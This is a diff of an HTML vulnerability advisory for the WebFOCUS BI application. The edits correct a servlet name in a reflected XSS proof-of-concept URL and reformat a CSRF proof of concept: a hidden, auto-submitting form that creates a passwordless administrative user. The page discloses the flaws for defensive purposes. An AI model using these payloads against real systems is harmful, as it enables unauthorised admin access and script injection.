@@ -41,7 +41,7 @@
         </p>
         <h4>Steps:</h4>
         <ol>
-            <li>Within a browser such as Google Chrome, navigate to the affected URL: hxxps:///webfocusbi.mysite.com/ibi_apps/WPServlet?%22%3e%3cscript%3ealert(%22XSS+in+Arbitrary+Parameter%22)%3C/script%3E%3C%22=foobar&IBIF_adhocfex=nothing</li>
+            <li>Within a browser such as Google Chrome, navigate to the affected URL: hxxps:///webfocusbi.mysite.com/ibi_apps/WFServlet?%22%3e%3cscript%3ealert(%22XSS+in+Arbitrary+Parameter%22)%3C/script%3E%3C%22=foobar&IBIF_adhocfex=nothing</li>
             <li>Observe that a pop up appears, indicating that JavaScript was injected into the page and executed.</li>
         </ol>
         <img class="body-img" src="/img/webfocus_xss.png" width="60%">
@@ -60,7 +60,8 @@
             <li>The victim visits a page with attacker-controlled content.  This may be an internal SharePoint site or a website on the internet. </li>
             <li>.  The attacker-controlled content contains the following HTML and JavaScript, which instructs the browser to add a new administrative user ("h00p") with no password. </br>
                 <pre>
-		&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
+
+	   &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
 	   &lt;form action="hxxps://webfocusbi.mysite.com/ibi_apps/WFServlet.ibfs"&gt;
 		    &lt;input type="hidden" name="IBFS1&#95;action" value="createUser" /&gt;
 		    &lt;input type="hidden" name="IBFS&#95;name" value="h00p" /&gt;
@@ -72,9 +73,9 @@
 			&lt;input type="hidden" name="IBFS&#95;pSetList" value="" /&gt;
 			&lt;input type="submit" value="Submit request" /&gt;
 	   &lt;/form&gt;
-		&lt;script&gt;
-		  document.forms[0].submit();
-		&lt;/script&gt;
+	   &lt;script&gt;
+		    document.forms[0].submit();
+	   &lt;/script&gt;
               </pre>
 			</li>
             <li>When viewing the list of administrative users, the victim will notice that a new administrative user ("h00p") was added to the WebFOCUS BI application.</li>
